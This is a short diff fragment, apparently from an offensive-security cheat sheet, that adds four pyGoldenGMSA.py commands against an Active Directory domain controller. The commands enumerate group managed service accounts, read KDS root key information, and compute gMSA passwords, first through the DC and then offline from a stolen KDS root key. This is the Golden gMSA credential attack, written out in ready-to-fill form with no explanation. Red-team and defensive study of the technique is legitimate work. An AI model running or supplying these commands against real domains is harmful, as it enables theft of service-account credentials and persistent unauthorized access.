@@ -1,0 +1,4 @@
+pyGoldenGMSA.py -u "$USER"@"$DOMAIN" -p "$PASSWORD" -d $DOMAIN --dc-ip $DC_IP gmsainfo
+pyGoldenGMSA.py -u "$USER"@"$DOMAIN" -p "$PASSWORD" -d $DOMAIN --dc-ip $DC_IP kdsinfo
+pyGoldenGMSA.py -u "$USER"@"$DOMAIN" -p "$PASSWORD" -d $DOMAIN --dc-ip $DC_IP compute --sid $GMSA_SID
+pyGoldenGMSA.py compute --sid $GMSA_SID --kdskey "$KDS_ROOT_KEY" --pwdid "$GMSA_PASSWORD_ID"
